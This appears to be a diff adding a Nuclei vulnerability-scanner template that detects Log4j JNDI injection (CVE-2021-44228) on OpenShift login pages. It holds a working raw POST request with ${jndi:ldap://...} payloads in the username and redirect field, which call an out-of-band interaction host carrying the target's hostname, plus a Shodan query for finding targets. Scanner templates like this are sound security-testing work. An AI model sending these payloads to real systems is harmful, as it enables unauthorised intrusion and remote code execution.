@@ -1,0 +1,65 @@
+id: openshift-log4j-rce
+
+info:
+  name: OpenShift - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    OpenShift is susceptible to Log4j JNDI remote code execution. OpenShift is a unified platform to build, modernize, and deploy applications at scale.
+  reference:
+    - https://access.redhat.com/security/cve/cve-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+    shodan-query: title:"OpenShift"
+  tags: cve,cve2021,rce,jndi,log4j,openshift,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /Login HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/login?then=/oauth/authorize?client_id=openshift-web-console&idp=basic&redirect_uri={{BaseURL}}/console/oauth&response_type
+        Content-Type: application/x-www-form-urlencoded
+
+        then=%2Foauth%2Fauthorize%3Fclient_id%3Dopenshift-web-console%26idp%3Dbasic%26redirect_uri%3D${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}26response_type%3Dcode&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' #Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output#
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip #Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' #Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' #Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+
+# digest: 490a0046304402207efd89e369904464503e470e3726c28383af202af384617d0a4ce9a7f65ca4ba02203b6d43a33ec6df5d0a4f43f979eeda9e3ec2fa07ddd4bc0c756fd76d3c77412a:922c64590222798bb761d5b6d8e72950
